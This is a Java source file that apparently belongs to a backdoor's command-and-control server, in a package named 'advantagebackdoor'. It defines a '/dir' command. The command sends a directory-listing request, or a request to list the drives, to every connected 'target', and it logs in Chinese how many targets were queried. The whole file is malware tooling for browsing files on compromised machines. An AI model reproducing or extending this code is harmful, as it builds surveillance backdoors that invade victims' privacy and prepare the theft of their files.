package me.faintcloudy.advantagebackdoor.server.command;

import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;
import me.faintcloudy.advantagebackdoor.api.message.play.server.DirectoryRequestMessage;

public class DirCommand extends ServerCommand {
    public DirCommand() {
        super("/dir", "查看目标目录 (/dir disk 可以查看对方磁盘)");
    }

    @Override
    public void execute(String[] args) {
        if (args.length < 2)
        {
            Log4jServer.getInstance().getLogger().info("正确用法: /dir <folder> 或者 /dir disk 以查看对方磁盘");
            return;
        }

        String folder = args[1];
        DirectoryRequestMessage message = new DirectoryRequestMessage(folder);
        for (UserConnection target : Log4jServer.getInstance().getTargets()) {
            target.sendMessage(message);
        }

        Log4jServer.getInstance().getLogger().info("已向 " + Log4jServer.getInstance().getUsers().size() + " 个目标发送了目录请求");
    }
}
